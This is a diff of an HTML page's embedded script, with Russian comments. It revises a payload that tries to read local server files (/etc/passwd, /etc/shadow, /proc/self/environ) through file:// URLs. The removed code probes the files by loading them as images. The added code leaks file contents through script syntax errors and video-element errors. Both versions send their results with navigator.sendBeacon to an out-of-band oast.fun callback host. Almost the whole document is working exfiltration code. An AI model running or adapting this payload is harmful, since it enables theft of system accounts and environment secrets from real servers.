@@ -4,24 +4,29 @@
 <script>
     const hook = "https://esqbwjbyepcxrsacleqf2vy5xwjs1cvp1.oast.fun";
 
-    function checkFile(path) {
-        const img = new Image();
-        const start = Date.now();
-        
-        img.onload = () => navigator.sendBeacon(hook + "/EXISTS_" + btoa(path));
-        img.onerror = () => {
-            const duration = Date.now() - start;
-            // Если ошибка пришла мгновенно - файл есть, но это не картинка.
-            // Если долго - возможно, таймаут.
-            navigator.sendBeacon(hook + "/PROBE_FILE", JSON.stringify({path: path, time: duration}));
-        };
-        img.src = "file://" + path;
-    }
+    // Метод 1: Ошибка парсинга скрипта (палит первую строку)
+    window.onerror = function(msg, url, line, col, error) {
+        navigator.sendBeacon(hook + "/CONTENT_LEAK", JSON.stringify({
+            message: msg,
+            line: line,
+            file: url
+        }));
+    };
 
-    // Проверяем классику Linux серверов
-    checkFile("/etc/passwd");
-    checkFile("/etc/shadow"); // Тут точно будет ошибка доступа, но это пруф
-    checkFile("/proc/self/environ"); // Золотая жила переменных окружения
+    // Пытаемся подключить файл как скрипт
+    // Браузер выдаст SyntaxError, так как passwd - это не JS.
+    // В тексте ошибки часто пишет: "Unexpected token 'root'..."
+    const script = document.createElement('script');
+    script.src = "file:///etc/passwd";
+    document.body.appendChild(script);
+
+    // Метод 2: Проверка через тег <video> (для бинарных данных/env)
+    const v = document.createElement('video');
+    v.onerror = () => {
+        // Если ошибка "MEDIA_ERR_SRC_NOT_SUPPORTED", значит файл прочитан, но не видео
+        navigator.sendBeacon(hook + "/VIDEO_PROBE", "File accessed but format invalid");
+    };
+    v.src = "file:///proc/self/environ";
 </script>
 </body>
 </html>
